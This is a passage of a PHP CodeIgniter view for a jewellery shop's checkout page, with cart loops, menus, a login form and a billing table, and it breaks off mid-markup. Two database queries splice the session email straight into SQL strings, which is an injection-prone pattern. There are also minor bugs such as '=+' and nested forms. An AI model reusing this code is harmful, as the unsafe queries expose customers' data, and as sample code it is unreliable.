<?php 
$email = $this->session->userdata('email_address'); 

?>
<!DOCTYPE html>
<!--[if IE 8 ]>
<html class="no-js ie8" lang="en"> <![endif]-->
<!--[if IE 9 ]>
<html class="no-js ie9" lang="en"> <![endif]-->
<!--[if (gt IE 9)|!(IE)]><!-->
<html class="no-js" lang="en"> <!--<![endif]-->

<!-- Mirrored from diana.html.themeplayers.net/checkout.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 20 Oct 2015 03:48:17 GMT -->
<head lang="en">
    <meta charset="UTF-8">
    <meta name="description" content="Macaroon -Creative Patisserie HTML Template">
    <meta name="author" content="CreateIT">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <title>Jewel of equator</title>
    <link rel="stylesheet" href="<?php echo base_url() ?>fonts/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="<?php echo base_url() ?>css/style.css">
    <link rel="stylesheet" href="<?php echo base_url() ?>css/select2.css">

    <!-- <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
    <link rel="stylesheet" type="text/css" href="css/style.css">-->


    <!--[if lt IE 9]>
    <script src="bootstrap/js/html5shiv.min.js"></script>
    <script src="bootstrap/js/respond.min.js"></script>
    <![endif]-->

    <script src="<?php echo base_url() ?>js/modernizr.custom.js"></script>
</head>

            <?php  $cart_check = $this->cart->contents();
            
            // If cart is empty, this will show below message.
             if(empty($cart_check)) {
             //echo 'To add products to your shopping cart click on "Add to Cart" Button'; 
       ?>
       
       <?php
             }  ?>     
              
                  <?php
                  // All values of cart store in "$cart". 
                  if ($cart = $this->cart->contents()): ?> 
    <?php endif; ?>

<?php
                    $grand_total = 0;
                    $i = 1;
          $qty = 0;

                    foreach ($cart as $item):
                        //   echo form_hidden('cart[' . $item['id'] . '][id]', $item['id']);
                        //  Will produce the following output.
                        // <input type="hidden" name="cart[1][id]" value="1" />
                        
                        echo form_hidden('cart[' . $item['id'] . '][id]', $item['id']);
                        echo form_hidden('cart[' . $item['id'] . '][rowid]', $item['rowid']);
                        echo form_hidden('cart[' . $item['id'] . '][name]', $item['name']);
                        echo form_hidden('cart[' . $item['id'] . '][price]', $item['price']);
                        echo form_hidden('cart[' . $item['id'] . '][qty]', $item['qty']);
                        ?>
                        
                       <?php $i++; ?>
                           
              <!--
                           
                                $ <?php echo number_format($item['price'], 2); ?>
                                <?php echo form_input('cart[' . $item['id'] . '][qty]', $item['qty'], 'maxlength="3" size="1" style="text-align: right"'); ?>                            
              <?php $grand_total = $grand_total + $item['subtotal']; ?>
              <?php $qty = $qty + $item['qty']; ?>
              <?php $total_qty =+ $item['qty']; ?>                          
                                $ <?php echo number_format($item['subtotal'], 2) ?> 
                -->
                     <?php endforeach; ?>  


<body class="ct-headroom--scrollUpBoth cssAnimate">
<div class="ct-preloader"><div class="ct-preloader-content"></div></div>
    <nav class="ct-menuMobile">
        <ul class="ct-menuMobile-navbar">
            <li class="dropdown">
                <a href="#"><i class="fa fa-home fa-fw"></i> Home</a>
                <ul class="dropdown-menu">
                    <li><a href="index-2.html"><i class="fa fa-angle-right fa-fw"></i> Home v1</a></li>
                    <li><a href="index2.html"><i class="fa fa-angle-right fa-fw"></i> Home v2</a></li>
                </ul>
            </li>
            <li class="dropdown">
                <a href="#"><i class="fa fa-building-o fa-fw"></i> Pages</a>
<ul class="dropdown-menu">
                    <li><a href="about-us.html"><i class="fa fa-angle-right fa-fw"></i> About Us</a></li>
                    <li><a href="our-mission.html"><i class="fa fa-angle-right fa-fw"></i> Our Mission</a></li>
                    <li><a href="testimonials.html"><i class="fa fa-angle-right fa-fw"></i> Testimonials</a></li>
                    <li><a href="pricing.html"><i class="fa fa-angle-right fa-fw"></i> Pricing</a></li>
                    <li><a href="our-services.html"><i class="fa fa-angle-right fa-fw"></i> Our services</a></li>
                    <li><a href="our-team.html"><i class="fa fa-angle-right fa-fw"></i> Our Designers</a></li>
                    <li><a href="faq.html"><i class="fa fa-angle-right fa-fw"></i> FAQ</a></li>
                </ul>
            </li>
            <li class="dropdown">
                <a href="#"><i class="fa fa-dot-circle-o fa-fw"></i> Products</a>
                <ul class="dropdown-menu">
                    <li><a href="paypal-shop-page.html"><i class="fa fa-angle-right fa-fw"></i> Shop with Paypal integration</a></li>
                    <li><a href="collections.html"><i class="fa fa-angle-right fa-fw"></i> Shop Collection Type 1</a></li>
                                                    <li><a href="collections2.html"><i class="fa fa-angle-right fa-fw"></i> Shop Collection Type 2</a></li>
                    <li><a href="collections-list.html"><i class="fa fa-angle-right fa-fw"></i> Shop Collection List</a></li>
                    <li><a href="single-product.html"><i class="fa fa-angle-right fa-fw"></i> Single Product</a></li>
                    <li><a href="collections-no-sidebar.html"><i class="fa fa-angle-right fa-fw"></i> Shop No Sidebar</a></li>
                </ul>
            </li>
            <li class="dropdown">
                <a href="#"><i class="fa fa-list-ol fa-fw"></i> TOP 5 Manufacturers</a>
                <ul class="dropdown-menu">
                    <li><a href="#"><i class="fa fa-angle-right fa-fw"></i> DaVonna</a></li>
                    <li><a href="#"><i class="fa fa-angle-right fa-fw"></i> Miadora</a></li>
                    <li><a href="#"><i class="fa fa-angle-right fa-fw"></i> Disney</a></li>
                    <li><a href="#"><i class="fa fa-angle-right fa-fw"></i> Molly and Emma</a></li>
                    <li><a href="#"><i class="fa fa-angle-right fa-fw"></i> Junior Jewels</a></li>
                </ul>
            </li>
            <li class="dropdown">
                <a href="#"><i class="fa fa-image fa-fw"></i> Portfolio</a>
                <ul class="dropdown-menu">
                    <li><a href="portfolio-masonry.html"><i class="fa fa-angle-right fa-fw"></i> Masonry Default</a></li>
                    <li><a href="portfolio-masonry-column1.html"><i class="fa fa-angle-right fa-fw"></i> Masonry 1 Column</a></li>
                    <li><a href="portfolio-masonry-column2.html"><i class="fa fa-angle-right fa-fw"></i> Masonry 2 Columns</a></li>
                    <li><a href="portfolio-masonry-column3.html"><i class="fa fa-angle-right fa-fw"></i> Masonry 3 Columns</a></li>
                    <li><a href="portfolio-left-sidebar.html"><i class="fa fa-angle-right fa-fw"></i> Simple Left Sidebar</a></li>
                    <li><a href="portfolio-right-sidebar.html"><i class="fa fa-angle-right fa-fw"></i> Simple Right Sidebar</a></li>
                </ul>
            </li>
            <li class="dropdown">
                <a href="#"><i class="fa fa-pencil-square-o fa-fw"></i> Blog</a>
                <ul class="dropdown-menu">
                    <li><a href="blog.html"><i class="fa fa-angle-right fa-fw"></i> Blog Default</a></li>
                    <li><a href="blog-wide.html"><i class="fa fa-angle-right fa-fw"></i> Blog Wide</a></li>
                    <li><a href="blog-full-width.html"><i class="fa fa-angle-right fa-fw"></i> Blog Full Width</a></li>
                    <li><a href="blog-left-sidebar.html"><i class="fa fa-angle-right fa-fw"></i> Blog Left Sidebar</a></li>
                    <li><a href="blog-masonry.html"><i class="fa fa-angle-right fa-fw"></i> Blog 2 Columns</a></li>
                </ul>
            </li>
            <li><a href="#"><i class="fa fa-phone-square fa-fw"></i> Contact</a></li>
        </ul>
    </nav>

    <div class="ct-shopMenuMobile">
        <!-- Language Dropdown -->
        <div class="btn-group">
            <button type="button" class="btn btn-white btn-md dropdown-toggle" data-toggle="dropdown" aria-expanded="false">
                EN <span class="caret"></span>
            </button>
            <ul class="dropdown-menu" role="menu">
                <li><a href="#">FR</a></li>
                <li><a href="#">ES</a></li>
                <li><a href="#">DE</a></li>
                <li><a href="#">PT</a></li>
            </ul>
        </div>
        <!-- Currency Dropdown -->
        <div class="btn-group">
            <button type="button" class="btn btn-white btn-md dropdown-toggle" data-toggle="dropdown" aria-expanded="false">
                $ <span class="caret"></span>
            </button>
            <ul class="dropdown-menu" role="menu">
                <li><a href="#">EUR €</a></li>
                <li><a href="#">GBP £</a></li>
            </ul>
        </div>
        <nav class="ct-shopMenuMobile-navbar">
            <ul class="list-unstyled">
                <li><a href="login.html"><i class="fa fa-user fa-fw"></i> Login</a></li>
                <li><a href="create-account.html"><i class="fa fa-pencil fa-fw"></i> Create an account</a></li>
                <li><a href="my-account.html"><i class="fa fa-cog fa-fw"></i> My Account</a></li>
                <li><a href="wishlist.html"><i class="fa fa-edit fa-fw"></i> Wishlist</a></li>
                <li><a href="checkout.html"><i class="fa fa-archive fa-fw"></i> Checkout</a></li>
            </ul>
        </nav>
        <div class="ct-shopMenuMobile-basket">
            <a href="my-cart.html"><i class="fa fa-shopping-cart fa-fw"></i> My Basket <span class="ct-topBar-basket-quantity">(3 items)</span></a>
            <div class="ct-shopMenuMobile-basketContainer">
                
                <div class="ct-shopMenuMobile-basketWrap ct-shopMenuMobile-subTotal ct-fw-600">
                    <div class="pull-left text-uppercase">Subtotal</div>
                    <div class="pull-right">$457.99</div>
                    <div class="clearfix"></div>
                </div>
            </div>
        </div>
    </div>

    <div id="ct-js-wrapper" class="ct-pageWrapper">
        <!-- navbar + logo menu -->
        <div class="ct-navbarMobile">
            <button type="button" class="navbar-toggle">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="index-2.html"><img src="<?php echo base_url() ?>images/logo.png" alt="Diana Logo"> </a>
            <button type="button" class="navbarShop-toggle">
                <i class="fa fa-fw fa-user"></i>
            </button>
        </div>

        <!-- TOPBAR -->
        <div class="ct-topBar">
            <div class="container">
                <div class="ct-topBar-navigation pull-left">
                    <ul class="list-unstyled">
                    <?php
                    if(!$this->session->userdata('is_logged_in')){ ?>                      
                        <li><a href="<?php echo base_url() ?>administratoris/"><i class="fa fa-fw fa-user"></i> <?php echo "Login" ?></a></li>
                        <li><a href="<?php echo base_url() ?>register/"><i class="fa fa-fw fa-pencil"></i> Register</a></li>
                   <?php }else{ ?>
                        <?php
                            $sqlStr  = $this->db->query("SELECT * FROM membership WHERE email_address = '$email'");
                            foreach ($sqlStr->result() as $row){
                                $fname = $row->first_name;
                                $lname = $row->last_name;
                        ?>
                        <li><i class="fa fa-fw fa-user"></i> <?php echo "Hi, ".$fname ?></li>                        
                        <?php } ?>
                        <li><a href="<?php echo base_url() ?>register/"><i class="fa fa-fw fa-pencil009"></i> &nbsp;</a></li>
                    <?php } ?>
                    </ul>
                </div>
                <div class="pull-right">
                    <div class="ct-topBar-basket">                        
<!---           -->
                <?php
                  // All values of cart store in "$cart". 
                  if ($cart = $this->cart->contents()): ?>
                    
                    <?php
                     // Create form and send all values in "shopping/update_cart" function.
                    //echo form_open('cart/update_cart');
                    $grand_total = 0;
                    $i = 1;

                    foreach ($cart as $item):
                        //   echo form_hidden('cart[' . $item['id'] . '][id]', $item['id']);
                        //  Will produce the following output.
                        //echo '<input type="text" name="cart[1][id]" value="'.$item['name'].'" />';
                        
                        echo form_hidden('cart[' . $item['id'] . '][id]', $item['id']);
                        echo form_hidden('cart[' . $item['id'] . '][rowid]', $item['rowid']);
                        echo form_hidden('cart[' . $item['id'] . '][name]', $item['name']);
                        echo form_hidden('cart[' . $item['id'] . '][price]', $item['price']);
                        echo form_hidden('cart[' . $item['id'] . '][qty]', $item['qty']);
                        ?>
                       
                            <?php
                                $this->db->where('serial', $item['id']);
                                $query = $this->db->get('property');
                                foreach ($query->result() as $row)
                                {
                            ?>
                       
                            <?php } ?>
                        <?php $grand_total = $grand_total + $item['subtotal']; ?>
                        <?php endforeach; ?>
                        <?php endif; ?>
                        <a href="#"><span class="ct-topBar-basket-cart"><i class="fa fa-fw fa-shopping-cart"></i> Cart: </span><span class="ct-topBar-basket-quantity"><?php echo $qty; ?> item(s)</span><span class="ct-topBar-basket-price"> - $<?php echo number_format($grand_total, 2); ?></span></a>
                        <div class="ct-topBar-basket-info">

                <?php
                  // All values of cart store in "$cart". 
                  if ($cart = $this->cart->contents()): ?>
                    
                    <?php
                     // Create form and send all values in "shopping/update_cart" function.
                    echo form_open('cart/update_cart');
                    $grand_total = 0;
                    $i = 1;

                    foreach ($cart as $item):
                        //   echo form_hidden('cart[' . $item['id'] . '][id]', $item['id']);
                        //  Will produce the following output.
                        //echo '<input type="text" name="cart[1][id]" value="'.$item['name'].'" />';
                        
                        echo form_hidden('cart[' . $item['id'] . '][id]', $item['id']);
                        echo form_hidden('cart[' . $item['id'] . '][rowid]', $item['rowid']);
                        echo form_hidden('cart[' . $item['id'] . '][name]', $item['name']);
                        echo form_hidden('cart[' . $item['id'] . '][price]', $item['price']);
                        echo form_hidden('cart[' . $item['id'] . '][qty]', $item['qty']);
                        ?>
                       
                            <?php
                                $this->db->where('serial', $item['id']);
                                $query = $this->db->get('property');

                                foreach ($query->result() as $row)
                                {
                            ?>

                            <div class="ct-cartItem">
                                <a href="single-product.html">
                                    <div class="ct-cartItem-image pull-left">
                                        <img class="pull-left" src="<?php echo base_url() ."images/". $row->image_name ?>" alt="Wishlist Product 1">
                                    </div>
                                    <div class="ct-cartItem-title">
                                        <?php echo $item['name']; ?>
                                    </div>
                                    <div class="ct-cartItem-price">
                                        $<?php echo number_format($item['price'], 2); ?>
                                    </div>
                                    <div class="clearfix"></div>
                                </a>
                            </div>

                            <?php } ?>
                        <?php $grand_total = $grand_total + $item['subtotal']; ?>
                            
                        <?php endforeach; ?>
                        <?php echo form_close(); ?>
                        <?php endif; ?>

                            
                            <div class="ct-cartSubtotal">
                                <div class="pull-left ct-fw-600">Subtotal</div>
                                <div class="pull-right ct-fw-600">$<?php echo number_format($grand_total, 2); ?></div>
                                <div class="clearfix"></div>
                            </div>
                            <div class="ct-cartGoNext text-uppercase ct-u-paddingBoth20">
                                <a class="btn btn-default ct-u-width-49pc" href="<?php echo base_url(); ?>mycart/" role="button">View Cart <i class="fa fa-angle-double-right fa-fw"></i></a>
                                <a class="btn btn-default pull-right ct-u-width-49pc" href="<?php echo base_url(); ?>cart/" role="button">Checkout <i class="fa fa-angle-double-right fa-fw"></i></a>
                            </div>
                        </div>
                    </div>



                    <div class="btn-group">
                        <button type="button" class="btn btn-md dropdown-toggle" data-toggle="dropdown" aria-expanded="false">
                            EN <span class="caret"></span>
                        </button>
                        <ul class="dropdown-menu" role="menu">
                            <li><a href="#">FR</a></li>
                            <li><a href="#">ES</a></li>
                            <li><a href="#">DE</a></li>
                            <li><a href="#">PT</a></li>
                        </ul>
                    </div>
                    <div class="btn-group">
                        <button type="button" class="btn btn-md dropdown-toggle" data-toggle="dropdown" aria-expanded="false">
                            $ <span class="caret"></span>
                        </button>
                        <ul class="dropdown-menu" role="menu">
                            <li><a href="#">EUR €</a></li>
                            <li><a href="#">GBP £</a></li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
        <div class="ct-headerWrapper ct-u-paddingBottom40 ct-u-marginBottom40">
            <div class="container">

                <div class="ct-header ct-header--default ct-u-paddingTop30 ct-u-paddingBottom50">
                    <div class="ct-header-navigation">
                        <ul class="list-unstyled list-inline">
                            <li><a href="<?php echo base_url() ?>mycart/">My Account</a></li>
                    <?php
                    if(!$this->session->userdata('is_logged_in')){ ?>                      
                        <li><a href="<?php echo base_url(); ?>cart/">Checkout</a></li>
                    <?php }else{ ?>
                        <li><a href="<?php echo base_url(); ?>cart/">Checkout</a></li>
                        <li><a href="<?php echo base_url(); ?>logout/">Logout</a></li>
                    <?php } ?>                              
                            
                        </ul>
                    </div>
                    <div class="ct-header-logo">
                        <a href="index-2.html">
                            <img src="<?php echo base_url() ?>images/logo.png" alt="Diana Logo">
                        </a>
                    </div>
                </div>
            </div>
            <nav class="navbar yamm">
                <div class="container">
                    <ul class="nav navbar-nav ct-navbar--fadeIn">
                        <li class="dropdown">
                            <a href="<?php echo base_url(); ?>">Home</a>
                            <ul class="dropdown-menu">
                                <li>
                                    <div class="yamm-content">
                                        <div class="row">
                                            <div class="col-sm-4">
                                                <h5 class="text-uppercase"><strong>Home Pages</strong>
                                                    <br><small>Select your homepage</small>
                                                </h5>
                                                <ul class="list-unstyled">
                                                    <li><a href="index-2.html"><i class="fa fa-angle-right fa-fw"></i> Home - v1</a></li>
                                                    <li><a href="index2.html"><i class="fa fa-angle-right fa-fw"></i> Home - v2</a></li>
                                                </ul>
                                            </div>
                                            <div class="col-sm-4">
                                                <h5 class="text-uppercase"><strong>Headers</strong>
                                                    <br><small>Select your header</small>
                                                </h5>
                                                <ul class="list-unstyled">
                                                    <li><a href="index-paralax.html"><i class="fa fa-angle-right fa-fw"></i> Parallax</a></li>
                                                    <li><a href="index-2.html"><i class="fa fa-angle-right fa-fw"></i> Slider</a></li>
                                                    <li><a href="index-video.html"><i class="fa fa-angle-right fa-fw"></i> Video</a></li>
                                                    <li><a href="index-logo-left.html"><i class="fa fa-angle-right fa-fw"></i> Logo Left</a></li>
                                                </ul>
                                            </div>
                                            <div class="col-sm-4">
                                                <h5 class="text-uppercase"><strong>Menu/Top bars</strong>
                                                    <br><small>Select your bar</small>
                                                </h5>
                                                <ul class="list-unstyled">
                                                    <li><a href="index-black-menu.html"><i class="fa fa-angle-right fa-fw"></i> Black Menu</a></li>
                                                    <li><a href="index-grey-top.html"><i class="fa fa-angle-right fa-fw"></i> Grey Top</a></li>
                                                    <li><a href="index-both-colour.html"><i class="fa fa-angle-right fa-fw"></i> Menu/Top Colour</a></li>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </li>
                            </ul>
                        </li>
                        <li class="dropdown">
                            <a href="<?php echo base_url(); ?>collection/">Collections</a>
                            <!--        We need here padding-bottom 0 to display properly the image inside this content. Please, don't change paddingBottom.        -->
                            <ul class="dropdown-menu ct-u-paddingBottom0">
                                <li>
                                    <div class="yamm-content">
                                        <div class="row">
                                            <div class="col-md-4 col-sm-6">
                                                <h5 class="text-uppercase"><strong>Products</strong><br><small>Jewellery</small></h5>
                                                <ul class="list-unstyled">
                                                    <li><a href="paypal-shop-page.html"><i class="fa fa-angle-right fa-fw"></i> Shop with Paypal integration</a></li>
                                                    <li><a href="collections.html"><i class="fa fa-angle-right fa-fw"></i> Shop Collection Type 1</a></li>
                                                    <li><a href="collections2.html"><i class="fa fa-angle-right fa-fw"></i> Shop Collection Type 2</a></li>
                                                    <li><a href="collections-list.html"><i class="fa fa-angle-right fa-fw"></i> Shop Collection List</a></li>
                                                    <li><a href="single-product.html"><i class="fa fa-angle-right fa-fw"></i> Single Product</a></li>
                                                    <li><a href="collections-no-sidebar.html"><i class="fa fa-angle-right fa-fw"></i> Shop No Sidebar</a></li>
                                                </ul>
                                                <div class="clearfix"></div>
                                            </div>
                                            <div class="col-md-4 col-sm-6">
                                                <h5 class="text-uppercase"><strong>Shop Pages</strong><br><small>Shopping</small></h5>
                                                <ul class="list-unstyled">
                                                    <li><a href="my-cart.html"><i class="fa fa-angle-right fa-fw"></i> Cart</a></li>
                                                    <li><a href="checkout.html"><i class="fa fa-angle-right fa-fw"></i> Checkout</a></li>
                                                    <li><a href="wishlist.html"><i class="fa fa-angle-right fa-fw"></i> Wishlist</a></li>
                                                    <li><a href="create-account.html"><i class="fa fa-angle-right fa-fw"></i> Register</a></li>
                                                    <li><a href="login.html"><i class="fa fa-angle-right fa-fw"></i> Login</a></li>
                                                    <li><a href="lost-password.html"><i class="fa fa-angle-right fa-fw"></i> Lost Password</a></li>
                                                </ul>
                                            </div>
                                            <div class="col-md-4 hidden-sm">
                                                <div class="ct-collectionRightPicture">
                                                    <img src="<?php echo base_url() ?>images/main-menu-collection-right-bg.png" alt="">
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </li>
                            </ul>
                        </li>
                        <li class="dropdown">
                            <a href="about-us.html">Pages</a>
                    <ul class="dropdown-menu text-uppercase">
                        <li><a href="about-us.html">About Us</a></li>
                        <li><a href="our-mission.html">Our Mission</a></li>
                        <li><a href="testimonials.html">Testimonials</a></li>
                        <li><a href="pricing.html">Pricing</a></li>
                        <li><a href="our-services.html">Our Services</a></li>
                        <li><a href="our-team.html">Our Designers</a></li>
                        <li><a href="faq.html">FAQ</a></li>
                    </ul>
                        </li>
                                                <li class="dropdown">
                            <a href="portfolio-masonry.html">Lookbook</a>
                            <ul class="dropdown-menu text-uppercase">
                                <li class="dropdown-submenu">
                                    <a href="portfolio-masonry.html">Masonry <i class="fa fa-angle-double-down fa-fw"></i></a>
                                    <ul class="dropdown-menu">
                                        <li><a href="portfolio-masonry.html">Default</a></li>
                                        <li><a href="portfolio-masonry-column1.html">1 Column</a></li>
                                        <li><a href="portfolio-masonry-column2.html">2 Columns</a></li>
                                        <li><a href="portfolio-masonry-column3.html">3 Columns</a></li>
                                    </ul>
                                </li>
                                <li><a href="portfolio-left-sidebar.html">Left Sidebar</a></li>
                                <li><a href="portfolio-right-sidebar.html">Right Sidebar</a></li>
                            </ul>
                        </li>
                        <li class="dropdown active">
                            <a href="blog.html">Blog</a>
                            <ul class="dropdown-menu text-uppercase">
                                <li class="dropdown-submenu">
                                     <a href="blog-full-width.html">Full Width <i class="fa fa-angle-double-down fa-fw"></i></a>
                                    <ul class="dropdown-menu">
                                        <li><a href="blog-wide.html">Left Image</a></li>
                                        <li><a href="blog-full-width.html">Top Image</a></li>
                                    </ul>
                                </li>
                                <li><a href="blog-left-sidebar.html">Left Sidebar</a></li>
                                <li><a href="blog.html">Right Sidebar</a></li>
                                <li><a href="blog-masonry.html">2 Columns</a></li>
                            </ul>
                        </li>
                        <li><a href="contact.html">Contact</a></li>
                    </ul>
                    <div id="ct-js-navSearch" class="ct-navbar-navSearch navbar-search pull-right">
                        <i class="fa fa-fw fa-search"></i>
                    </div>
                    <div class="ct-navbar-search">
                        <form role="form">
                            <div class="form-group">
                                <input type="text" class="form-control" placeholder="Please type keywords..." required>
                            </div>
                            <button class="ct-navbar-search-button" type="submit">
                                <i class="fa fa-search fa-fw"></i>
                            </button>
                        </form>
                    </div>
                </div>
            </nav>
        </div>

        <div class="ct-contentWrapper">

<?php if(!$this->session->userdata('is_logged_in')){ ?> 
                    <div class="col-md-8">
                        <h4 class="ct-headerBox ct-u-borderBottom ct-u-paddingBottom20 text-left ct-u-paddingTop50">Already a Member? <span class="ct-u-colorGrey">Login</span></h4>
                        <div class="ct-u-size16 ct-fw-700 ct-u-paddingBottom20 ct-u-paddingTop30">It's Easy...</div>

                        <form class="form-horizontal form-signin ct-u-paddingBottom20" method="post" action="<?php echo base_url(); ?>admin/login/validate_credentials/">
                            <div class="form-group">
                                <label for="username" class="col-sm-2 control-label">Email: </label>
                                <div class="col-sm-10">
                                    <input type="text" name="email_address" placeholder="Email" class="form-control" id="username" required>
                                </div>
                            </div>
                            <div class="form-group">
                                <label for="password" class="col-sm-2 control-label">Password:</label>
                                <div class="col-sm-10">
                                    <input type="password" name="password" placeholder="Password" class="form-control" id="password">
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="col-sm-offset-2 col-sm-10">
                                    <div class="pull-left ct-rememberPassword">
                                        <div class="checkbox">
                                            <input type="checkbox" id="rememberPassword" name="remember_me">
                                            <label for="rememberPassword">
                                                <span class="ct-rememberPassword-text ct-u-size14 ct-u-colorGrey">Remember my password</span>
                                            </label>
                                        </div>
                                    </div>
                                    <div class="pull-right ct-forgotPassword">
                                        <a href="lost-password.html" class="ct-forgotPassword-text">Lost your Password?</a>
                                    </div>
                                    <div class="clearfix"></div>
                                </div>
                            </div>
                            <div class="form-group">
                                <div class="col-sm-offset-2 col-sm-10"> 
                                <?php
                                    if(isset($message_error) && $message_error){
                                        echo '<div class="alert alert-error">';
                                          echo '<a class="close" data-dismiss="alert">×</a>';
                                          echo '<strong>Oh snap!</strong> Change a few things up and try submitting again.';
                                        echo '</div>';             
                                    }
                                ?>                                   
                                    <input type="submit" name="submit" value="Login" class="btn btn-large btn-default" />
                                </div>
                            </div>
                        </form>
                    </div>

                    <div class="col-md-4">
                        <h4 class="ct-headerBox ct-u-borderBottom ct-u-paddingBottom20 text-left ct-u-paddingTop50">Follow Us</h4>
                        <div class="ct-u-paddingBottom20 ct-u-paddingTop30">
                            <ul class="ct-socials ct-socials--small ct-socials--black list-inline list-unstyled">
                                  <li><a href="https://www.facebook.com/createITpl"><i class="fa fa-facebook fa-fw"></i></a></li>
                                <li><a href="https://twitter.com/createitpl"><i class="fa fa-twitter fa-fw"></i></a></li>
                                <li><a href="#"><i class="fa fa-rss fa-fw"></i></a></li>
                            </ul>
                        </div>
                        <div class="tweets_display">

                        </div>
                    </div>                    


<?php }else{ ?>

        <form name="billing" method="post" action="<?php echo base_url() . 'shopping/save_order' ?>">
            <div class="container">
                <h4 class="ct-headerBox ct-u-borderBottom ct-u-paddingBottom20 text-left ct-u-paddingTop50">Checkout</h4>
                <div class="row">
                    <div class="col-md-8">
                        <div class="ct-u-size16 ct-fw-600 ct-u-paddingBottom20 ct-u-paddingTop30">Billing Details</div>
                        

                        <table class="table table-striped">
                        <?php
                           $sqlStr  = $this->db->query("SELECT *,
  `tb_checkout`.`email_address` AS `email`,
  `tb_checkout`.`first_name`,
  `tb_checkout`.`last_name`
FROM
  `membership`
  INNER JOIN `tb_checkout` ON `membership`.`email_address` =
    `tb_checkout`.`email_address`
  INNER JOIN `tbl_countries` ON `tbl_countries`.`code` = `tb_checkout`.`country`
WHERE
  `membership`.`email_address` = '$email'");
                            foreach ($sqlStr->result() as $row){
                                $cat = $row->category;
                        ?> 
                            <tr>
                                <th>Name</th>
                                <td><?php echo $row->first_name." ".$row->last_name ?></td>
                            </tr>
                            <tr>
                                <th>Email</th>                               
                                <td><?php echo $email ?></td>                    
                            </tr>
                            <tr>
                                <th>Phone</th>
                                <td><?php echo $row->phone ?></td>
                            </tr>
                            <tr>
                                <th>Address</th>
                                <td><?php echo $row->address2 ?></td>
                            </tr>
                            <tr>
                                <th>City</th>
                                <td><?php echo $row->city ?></td>
                            </tr>
                            <tr>
                                <th>Zip Code</th>
                                <td><?php echo $row->zip ?></td>
                            </tr>
                            <tr>
                                <th>Country</th>
                                <td><?php echo $row->name ?></td>
                            </tr> 
                            <tr>
                                <th>You are as</th>
                        <?php 
                            //$Sql  = $this->db->query("SELECT * FROM tbl_catmember WHERE id='$cat'");
                                $this->db->where('id', $cat);
                                $query = $this->db->get('tbl_catmember');
                                foreach ($query->result() as $getidmember){
                                $catname = $getidmember->category;
                        ?>
                                <td style="text-transform: capitalize;"><?php echo $catname ?></td>
                        <?php } ?>
                            </tr> 
                            <?php } ?>                               
                        </table>      
                        



                        <form class="ct-u-paddingTop10" action="#">

                            <div class="ct-u-size16 ct-fw-600 ct-u-paddingTop40 ct-u-paddingBottom30">Shipping Address</div>
                            <div class="form-group ct-u-paddingBottom10">
                                <div class="checkbox ct-js-differentAddress">
                                    <input type="checkbox" id="differentAddress">
                                    <label for="differentAddress">
                                        <span class="ct-u-size16">Ship To A Different Address?</span>
                                    </label>
                                </div>
                            </div>

                            <div class="ct-differentShippingAddress is-notActive">
                            <div class="form-group">
                            <?php
                            /*
                                foreach ($cart as $item):

                                    echo form_input('cart[' . $item['id'] . '][id]', $item['id']);
                                        echo "<br>";
                                    
                                    echo form_input('cart[' . $item['id'] . '][name]', $item['name']);
                                    echo "<br>";
                                    echo form_input('cart[' . $item['id'] . '][price]', $item['price']);
                                    echo "<br>";
                                    echo form_input('cart[' . $item['id'] . '][qty]', $item['qty']);
                                    echo "<br>";
                                    */

                                ?>
                                    
                                    
                            <?php    
                                
                                //echo "<br>".$grand_total = $grand_total + $item['subtotal'];
                                // endforeach;
                            ?>    
                                <label for="country2" class="control-label">Country*</label>
                                <select class="ct-select ct-select--full" id="country2" name="country">
                                    <option value="0">&nbsp;</option>
                        <?php
                            $sqlStr  = $this->db->query("SELECT * FROM tbl_countries");
                            foreach ($sqlStr->result() as $baris){
                                $cd = $baris->code;
                                $name = $baris->name;
                        ?>
                                    <option value="<?php echo $cd ?>"><?php echo $name ?></option>
                        <?php } ?>
                                </select>
                            </div>

                            <div class="form-group">
                                <div class="row">
                                    <div class="col-sm-6">
                                        <label for="firstname" class="control-label">First Name*</label>
                                        <input type="text" class="form-control" name="fname" id="fname" required>
                                    </div>
                                    <div class="col-sm-6">
                                        <label for="lastname" class="control-label change-label">Last Name*</label>
                                        <input type="text" class="form-control" id="lastname" name="lname" required>
                                    </div>
                                </div>
                            </div>

                            <div class="form-group">
                                <label for="company" class="control-label">Company Name</label>
                                <input type="text" class="form-control" name="company" id="company">
                            </div>
                            <div class="form-group">
                                <label for="streetaddress" class="control-label">Your Address*</label>
                                <input type="text" class="form-control" name="address" id="streetaddress" placeholder="Street Address" required>
                                <div class="ct-u-paddingTop10">
                                    <input type="text" class="form-control" name="address" placeholder="Apartment, Unit, Suite, etc." required>
                                </div>
                            </div>
                            <div class="form-group">
                                <label for="city" class="control-label">Town/City*</label>
                                <input type="text" class="form-control" name="city" id="city" required>
                            </div>


                            <div class="form-group">
                                <div class="row">
                                    <div class="col-sm-6">
                                        <label for="region" class="control-label">State*</label>
                                        <input type="text" class="form-control" name="state" id="city" required>
                                        <!--
                                        <select class="ct-select ct-select--full" id="region" name="address">
                                            <option value="AB">Alabama</option>
                                            <option value="AR">Arizona</option>
                                            <option value="CF">California</option>
                                            <option value="FD">Florida</option>
                                            <option value="ID">Indiana</option>
                                            <option value="NV">Nevada</option>
                                            <option value="NY">New York</option>
                                            <option value="OH">Ohio</option>
                                            <option value="TX">Texas</option>
                                            <option value="WY">Wyoming</option>
                                        </select>
                                    -->
                                    </div>

                                </div>
                            </div>

                            <div class="form-group">
                                <div class="row">
                                    <div class="col-sm-6">
                                        <label for="email" class="control-label">Email Address*</label>                                        
                                        <input type="text" class="form-control" name="email" id="email" >
                                        <!--
                                        <select class="ct-select ct-select--full" id="email">
                                            <option value="firstemail">example@yahoo.com</option>
                                            <option value="secondemail">second.example@yahoo.com</option>
